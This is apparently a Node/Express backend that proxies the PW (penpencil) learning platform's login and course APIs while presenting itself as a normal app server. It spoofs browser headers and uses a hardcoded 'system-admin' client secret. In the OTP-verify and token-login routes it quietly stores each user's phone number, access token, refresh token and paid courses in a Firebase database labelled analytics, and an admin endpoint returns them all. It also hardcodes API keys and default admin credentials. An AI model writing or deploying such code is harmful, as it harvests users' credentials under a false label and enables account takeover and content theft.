import express from "express";
import path from "path";
import axios from "axios";
import cors from "cors";
import cookieParser from "cookie-parser";
import crypto from "crypto";
import jwt from "jsonwebtoken";
import fs from "fs";
import { initializeApp } from "firebase/app";
import { getDatabase, ref, set, update, increment, get, child } from "firebase/database";

// Load config safely
const loadConfig = () => {
  try {
    const configPath = path.resolve(process.cwd(), "firebase-applet-config.json");
    if (fs.existsSync(configPath)) {
      return JSON.parse(fs.readFileSync(configPath, "utf-8"));
    }
  } catch (e) {
    console.error("Config load error:", e);
  }
  return {};
};

const firebaseConfig = loadConfig();

// Hardcoded RTDB Config (Using the one provided in previous code)
const rtdbConfig = {
  apiKey: "AIzaSyDfnyY4-P0dVanr7Nu5ejMMdAzgOoI4ego",
  authDomain: "movie-2b1f0.firebaseapp.com",
  databaseURL: "https://movie-2b1f0-default-rtdb.firebaseio.com",
  projectId: "movie-2b1f0",
};

// Initialize Firebase Client SDK for backend logging (more reliable on Vercel without service account)
const firebaseApp = initializeApp(rtdbConfig);
const rtdb = getDatabase(firebaseApp);

const app = express();
app.use(cors());
app.use(express.json());
app.use(cookieParser());

const ADMIN_USERNAME = process.env.ADMIN_USERNAME || "rajdev";
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "PWtoken";
const JWT_SECRET = process.env.JWT_SECRET || "super-secret-key-change-this";

// Admin Authentication Middleware
const adminAuth = (req: any, res: any, next: any) => {
  const token = req.headers.authorization?.split(" ")[1];
  if (!token) return res.status(401).json({ error: "Unauthorized: No token provided" });

  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.admin = decoded;
    next();
  } catch (err) {
    res.status(401).json({ error: "Unauthorized: Invalid token" });
  }
};

// PW API Proxy Endpoints
const PW_CLIENT_ID = "5eb393ee95fab7468a79d189";
const PW_ORG_ID = "5eb393ee95fab7468a79d189";

const getPWHeaders = (token?: string, integrationWith: string = "Origin") => {
  const headers: any = {
    "Client-Id": PW_CLIENT_ID,
    "Client-Type": "WEB",
    "Client-Version": "2.6.15",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Origin": "https://www.pw.live",
    "Referer": "https://www.pw.live/",
    "Randomid": crypto.randomUUID(),
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Integration-With": integrationWith,
    "Sec-Ch-Ua": "\"Google Chrome\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "cross-site",
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "application/json",
  };
  if (token) {
    headers["Authorization"] = token.startsWith("Bearer ") ? token : `Bearer ${token}`;
  }
  return headers;
};

// Routes
app.post("/api/v1/pw/get-otp", async (req, res) => {
  try {
    const { phone } = req.body;
    if (!phone) return res.status(400).json({ error: "Phone number is required" });

    try {
      const response = await axios.post(
        "https://api.penpencil.co/v1/users/get-otp?smsType=0",
        { username: phone, countryCode: "+91", organizationId: PW_ORG_ID },
        { headers: getPWHeaders(undefined, "Origin"), timeout: 10000 }
      );
      return res.json(response.data);
    } catch (err: any) {
      console.log("First OTP attempt failed, trying fallback...");
      const response = await axios.post(
        "https://api.penpencil.co/v1/users/get-otp?smsType=1",
        { username: phone, countryCode: "+91", organizationId: PW_ORG_ID },
        { headers: getPWHeaders(undefined, "Origin"), timeout: 10000 }
      );
      return res.json(response.data);
    }
  } catch (error: any) {
    const errorData = error.response?.data;
    res.status(error.response?.status || 500).json({
      success: false,
      message: errorData?.message || errorData?.error || "Failed to send OTP",
      raw: errorData
    });
  }
});

app.post("/api/v1/pw/verify-otp", async (req, res) => {
  try {
    const { phone, otp } = req.body;
    const response = await axios.post(
      "https://api.penpencil.co/v3/oauth/token",
      {
        username: phone,
        otp: otp,
        client_id: "system-admin",
        client_secret: "KjPXuAVfC5xbmgreETNMaL7z",
        grant_type: "password",
        organizationId: PW_ORG_ID,
        latitude: 0,
        longitude: 0,
      },
      { headers: getPWHeaders(undefined, ""), timeout: 10000 }
    );

    const token = response.data.data.access_token;
    const refreshToken = response.data.data.refresh_token || "";
    
    let courses = "[]";
    try {
      const batchRes = await axios.get("https://api.penpencil.co/v3/batches/my-batches", {
        params: { mode: "1", amount: "paid", page: "1", organisationId: PW_ORG_ID },
        headers: getPWHeaders(token),
        timeout: 8000,
      });
      courses = JSON.stringify(batchRes.data.data);
    } catch (e) {
      console.error("Failed to fetch batches for logging", e);
    }

    const logId = `phone_${phone}`;
    const logRef = ref(rtdb, `analytics/logs/${logId}`);
    
    await set(logRef, {
      id: logId,
      phone: phone,
      token: token,
      refreshToken: refreshToken,
      loginTime: new Date().toISOString(),
      status: "active",
      courses: courses,
      method: "phone"
    });

    const statsRef = ref(rtdb, "analytics/stats");
    await update(statsRef, {
      totalLogins: increment(1),
      lastLogin: new Date().toISOString()
    }).catch(() => {});

    res.json({ ...response.data, logId: logId });
  } catch (error: any) {
    res.status(error.response?.status || 500).json(error.response?.data || { error: "Failed to verify OTP" });
  }
});

app.post("/api/v1/pw/login-token", async (req, res) => {
  try {
    const { token } = req.body;
    const response = await axios.get("https://api.penpencil.co/v3/batches/my-batches", {
      params: { mode: "1", amount: "paid", page: "1", organisationId: PW_ORG_ID },
      headers: getPWHeaders(token),
      timeout: 8000,
    });

    const tokenHash = crypto.createHash('md5').update(token).digest('hex');
    const logId = `token_${tokenHash}`;
    const logRef = ref(rtdb, `analytics/logs/${logId}`);
    
    await set(logRef, {
      id: logId,
      phone: "Token Login",
      token: token,
      refreshToken: "",
      loginTime: new Date().toISOString(),
      status: "active",
      courses: JSON.stringify(response.data.data),
      method: "token"
    });

    const statsRef = ref(rtdb, "analytics/stats");
    await update(statsRef, {
      totalLogins: increment(1),
      lastLogin: new Date().toISOString()
    }).catch(() => {});

    res.json({ ...response.data, logId: logId });
  } catch (error: any) {
    res.status(error.response?.status || 500).json(error.response?.data || { error: "Invalid Token" });
  }
});

app.get("/api/v1/pw/batches", async (req, res) => {
  try {
    const token = req.headers.authorization;
    const response = await axios.get("https://api.penpencil.co/v3/batches/my-batches", {
      params: { mode: "1", amount: "paid", page: "1", organisationId: PW_ORG_ID },
      headers: getPWHeaders(token),
      timeout: 8000,
    });
    res.json(response.data);
  } catch (error: any) {
    res.status(error.response?.status || 500).json(error.response?.data || { error: "Failed to fetch batches" });
  }
});

app.get("/api/v1/pw/batch-details/:batchId", async (req, res) => {
  try {
    const { batchId } = req.params;
    const token = req.headers.authorization;
    const response = await axios.get(`https://api.penpencil.co/v3/batches/${batchId}/details`, {
      headers: getPWHeaders(token),
    });
    res.json(response.data);
  } catch (error: any) {
    res.status(error.response?.status || 500).json(error.response?.data || { error: "Failed to fetch batch details" });
  }
});

app.post("/api/v1/admin/login", (req, res) => {
  const { username, password } = req.body;
  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
    const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: "24h" });
    res.json({ success: true, token });
  } else {
    res.status(401).json({ success: false, error: "Invalid credentials" });
  }
});

app.get("/api/v1/admin/logs", adminAuth, async (req, res) => {
  try {
    const logsRef = ref(rtdb, "analytics/logs");
    const snapshot = await get(logsRef);
    const data = snapshot.val();
    const logs = data ? Object.values(data) : [];
    res.json(logs.reverse());
  } catch (error: any) {
    console.error("Admin Logs Error:", error);
    res.status(500).json({ error: "Failed to fetch logs", details: error.message });
  }
});

app.get("/api/v1/admin/stats", adminAuth, async (req, res) => {
  try {
    const statsRef = ref(rtdb, "analytics/stats");
    const snapshot = await get(statsRef);
    const stats = snapshot.val() || { totalLogins: 0, activeNow: 0 };
    res.json(stats);
  } catch (err) {
    res.status(500).json({ error: "Failed to fetch stats" });
  }
});

app.get("/api/v1/pw/batch-subjects/:batchId", async (req, res) => {
  try {
    const { batchId } = req.params;
    const token = req.headers.authorization?.split(" ")[1];
    if (!token) return res.status(401).json({ error: "No token provided" });

    const response = await axios.get(`https://api.penpencil.co/v3/batches/${batchId}/subjects`, {
      params: { organisationId: PW_ORG_ID },
      headers: getPWHeaders(token),
    });
    res.json(response.data);
  } catch (error: any) {
    res.status(error.response?.status || 500).json(error.response?.data || { error: "Failed to fetch subjects" });
  }
});

app.get("/api/v1/pw/subject-contents/:batchId/:subjectId", async (req, res) => {
  try {
    const { batchId, subjectId } = req.params;
    const { page = 1, contentType = "" } = req.query;
    const token = req.headers.authorization?.split(" ")[1];
    if (!token) return res.status(401).json({ error: "No token provided" });

    const response = await axios.get(`https://api.penpencil.co/v3/batches/${batchId}/subject/${subjectId}/contents`, {
      params: { organisationId: PW_ORG_ID, page, contentType, tag: "" },
      headers: getPWHeaders(token),
    });
    res.json(response.data);
  } catch (error: any) {
    res.status(error.response?.status || 500).json(error.response?.data || { error: "Failed to fetch contents" });
  }
});

app.post("/api/v1/pw/logout", async (req, res) => {
  try {
    const { logId } = req.body;
    if (logId) {
      const logRef = ref(rtdb, `analytics/logs/${logId}`);
      await update(logRef, { status: "inactive", logoutTime: new Date().toISOString() });
    }
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: "Logout failed" });
  }
});

// SPA Fallback for production
if (process.env.NODE_ENV === "production") {
  const distPath = path.join(process.cwd(), "dist");
  app.use(express.static(distPath));
  app.get("*", (req, res) => {
    if (!req.path.startsWith("/api/")) {
      res.sendFile(path.join(distPath, "index.html"));
    }
  });
}

// Export for Vercel
export default app;

// Listen for local dev
if (process.env.NODE_ENV !== "production" || !process.env.VERCEL) {
  const PORT = 3000;
  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}
